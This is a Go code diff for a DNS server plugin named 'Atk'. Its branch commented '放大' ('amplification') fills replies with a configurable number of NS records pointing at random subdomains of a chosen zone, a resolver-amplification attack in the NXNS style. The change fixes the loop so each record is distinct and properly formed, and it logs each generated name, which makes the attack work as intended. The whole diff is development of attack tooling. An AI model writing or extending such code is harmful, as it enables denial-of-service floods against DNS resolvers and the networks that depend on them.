@@ -19,9 +19,8 @@ type Atk struct {
 	ip4Addr string
 }
 
-func (a Atk) ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) (int, error) {
+func (a Atk) ServeDNS(_ context.Context, w dns.ResponseWriter, r *dns.Msg) (int, error) {
 	state := request.Request{W: w, Req: r}
-
 	msg := new(dns.Msg)
 	msg.SetReply(r)
 	msg.Authoritative = true
@@ -54,11 +53,13 @@ func (a Atk) Name() string {
 
 func (a Atk) Response(msg *dns.Msg, iptype int) *dns.Msg {
 	if iptype == 0 { // 放大
-		rec := new(dns.NS)
-		rec.Hdr = dns.RR_Header{Class: dns.ClassINET, Ttl: 10, Rrtype: dns.TypeNS}
-		rec.Hdr.Name = msg.Question[0].Name
 		for i := 0; i < a.magni; i++ {
-			rec.Ns = strings.ToLower(randstr.RandomAlphanumeric(10)) + a.zoneip6
+			rec := new(dns.NS)
+			rec.Hdr = dns.RR_Header{Class: dns.ClassINET, Ttl: 10, Rrtype: dns.TypeNS}
+			rec.Hdr.Name = msg.Question[0].Name
+			ns := strings.ToLower(randstr.RandomAlphanumeric(10)) + "." + a.zoneip6 + "."
+			log.Infof("生成NS:  %v", ns)
+			rec.Ns = ns
 			msg.Ns = append(msg.Ns, rec)
 		}
 	} else {
